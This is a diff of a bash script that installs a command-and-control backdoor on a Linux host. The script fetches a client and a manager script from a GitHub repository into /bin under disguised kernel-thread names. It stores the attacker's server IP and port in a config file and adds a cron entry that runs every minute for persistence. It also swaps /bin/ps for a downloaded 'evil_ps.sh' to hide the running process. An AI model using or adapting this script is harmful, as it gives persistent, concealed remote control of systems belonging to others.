@@ -1,21 +1,19 @@
 #!/bin/bash
-echo "Installing dependencies..."
-echo "Installing python3"
+read -p "Enter server IP: " server_ip
+read -p "Enter server port: " server_port
+echo "Installing backdoor..."
 yum install -y -q python3
-echo "Downloading backdoor..."
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
-echo "Configure backdoor"
-read -p "Enter server ip: " server_ip
-read -p "Enter server port: " server_port
-rm -f /dev/.os
-echo "SERVER_IP = '$server_ip'" >> /dev/.os
-echo "SERVER_PORT = $server_port" >> /dev/.os
+rm -f /bin/cconf
+echo "SERVER_IP = $server_ip" >> /bin/cconf
+echo "SERVER_PORT = $server_port" >> /bin/cconf
 chmod +x /bin/kworker
+chmod +x /bin/kthread
 (crontab -l 2>/dev/null; echo "* * * * * /bin/kworker") | crontab -
 # https://stackoverflow.com/questions/28836042/how-to-hide-a-shell-script-running-in-the-background-from-ps-ef
 mv /bin/ps /bin/pso
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/evil_ps.sh > /bin/ps
-echo "Installation complete"
-echo "Starting backdoor"
+chmod +x /bin/ps
+echo "Installation complete. Starting backdoor"
 /bin/kworker
